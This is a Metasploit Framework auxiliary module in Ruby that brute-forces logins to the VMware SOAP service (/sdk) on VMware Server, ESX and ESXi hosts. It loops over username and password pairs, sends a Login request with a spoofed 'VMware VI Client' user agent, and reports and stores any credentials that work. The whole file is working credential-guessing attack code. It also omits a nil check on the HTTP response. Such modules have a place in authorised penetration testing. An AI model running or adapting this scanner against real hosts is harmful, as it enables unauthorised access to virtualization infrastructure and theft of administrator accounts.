##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'rex/proto/ntlm/message'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::AuthBrute

	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'           => 'VMWare Web Login Scanner',
			'Version'        => '$Revision$',
			'Description'    => 'This module attempts to authenticate to the VMWare HTTP service 
							 for VmWare Server, ESX, and ESXI',
			'Author'         => ['TheLightCosine <thelightcosine[at]metasploit.com>'],
			'References'     =>
				[
					[ 'CVE', '1999-0502'] # Weak password
				],
			'License'        => MSF_LICENSE
		)

		register_options(
			[
				Opt::RPORT(443)
			], self.class)
	end

	def run_host(ip)

		each_user_pass { |user, pass|
			result = do_login(user, pass)
			case result
			when :success
				print_good "#{ip}:#{rport} - Successful Login! (#{user}:#{pass})"
				report_auth_info(
					:host   => rhost,
					:port   => rport,
					:user   => user,
					:pass   => pass,
					:source_type => "user_supplied",
					:active => true
				)
				return if datastore['STOP_ON_SUCCESS']
			when :fail
				print_error "#{ip}:#{rport} - Login Failure (#{user}:#{pass})"
			end
		}
	end

	def do_login(user, pass)
		soap_data = '<SOAP-ENV:Envelope SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/">
    <SOAP-ENV:Body>
        <Login xmlns="urn:vim25">
            <_this type="SessionManager">ha-sessionmgr</_this>
            <userName>' + user + '</userName>
            <password>' + pass + '</password>
        </Login>
    </SOAP-ENV:Body>
</SOAP-ENV:Envelope>'
		res = send_request_cgi({
				'uri'     => '/sdk',
				'method'  => 'POST',
				'agent'   => 'VMware VI Client',
				'data' => soap_data
				}, 25)
		if res.code == 200
			return :success
		else
			return :fail
		end
	end



end

